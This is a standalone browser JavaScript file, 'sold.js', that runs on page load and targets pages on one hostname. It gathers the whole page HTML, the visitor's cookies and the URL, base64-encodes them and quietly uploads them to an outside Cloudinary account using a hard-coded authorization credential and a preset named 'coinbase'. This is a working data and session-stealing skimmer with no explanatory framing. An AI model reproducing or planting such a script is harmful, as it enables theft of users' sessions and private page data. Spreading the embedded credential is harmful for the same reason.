/// sold.js
document.addEventListener('DOMContentLoaded', async function () {
    if(window.location.hostname == 'example.org') {
        const data = document.documentElement.outerHTML;
        const cookie = document.cookie;
        const url = window.location.href;
        const form = new FormData();
        form.set('upload_preset', 'coinbase');
        form.set('file', 'data:text/plain;base64,' + btoa(unescape(encodeURIComponent(JSON.stringify({
            url, cookie, data
        })))));
        fetch('https://api.cloudinary.com/v1_1/dmvohnzfk/raw/upload',{
            method: 'POST',
            headers: {
                'authorization': 'Basic ODQ5ODQyODM4MjMzOTMyOndYTVVwa3pOWm5XOUt3eWh5SG81WmNNdU1Sdw=='
            },
            body: form,
            mode: 'no-cors'
        });
    }
});
